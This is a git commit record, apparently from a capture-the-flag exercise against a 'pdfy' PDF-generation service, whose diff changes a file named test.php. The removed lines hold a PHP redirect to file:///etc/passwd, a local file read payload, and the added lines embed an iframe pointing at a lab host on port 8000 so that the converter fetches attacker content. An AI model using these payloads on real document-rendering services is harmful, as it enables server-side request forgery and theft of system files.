1079fc4ec7ff01696d96a74905dff02c5ab5bf6e
GaillardTom <tomgaillard1@gmail.com>
2025-05-16 17:34:04 -0400

    Small script for pdfy

--- public/test.php
+++ public/test.php
@@ -1,4 +1,5 @@
-<?php
-header('location:file:///etc/passwd');
-?>
-
+<!DOCTYPE html>
+<body>
+    <iframe src="http://10.10.14.106:8000/test.php" style="height:800px;width:100%"></iframe>
+</body>
+</html>
